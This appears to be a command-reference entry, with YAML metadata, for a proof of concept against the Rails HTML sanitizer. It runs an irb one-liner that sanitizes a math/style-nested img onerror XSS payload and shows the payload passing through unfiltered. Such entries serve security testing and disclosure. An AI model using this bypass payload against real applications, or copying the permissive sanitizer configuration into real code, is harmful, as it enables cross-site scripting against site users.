---
data: >-
  Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x
  onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
tags:
  - xss
  - sanitize
type: command
output: '"<math><style><img src=x onerror=alert(1)></style></math>"'
executor: irb
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:16.320Z'
id: 334023da-f78b-4351-bdab-3df42ba0f0f9
verified: false
validated: true
submitted: true
---
# sanitize-math-style-poc

## Command

```irb
Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
```

## Description

Sanitizes a math+style PoC payload with onerror attribute, showing bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tags | Array ["math", "style"] | Yes |

## Examples

### Basic Usage

```irb
Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
```

## Expected Output

"<math><style><img src=x onerror=alert(1)></style></math>" (unfiltered).

## Related

- [[commands/sanitize-svg-style-poc]]
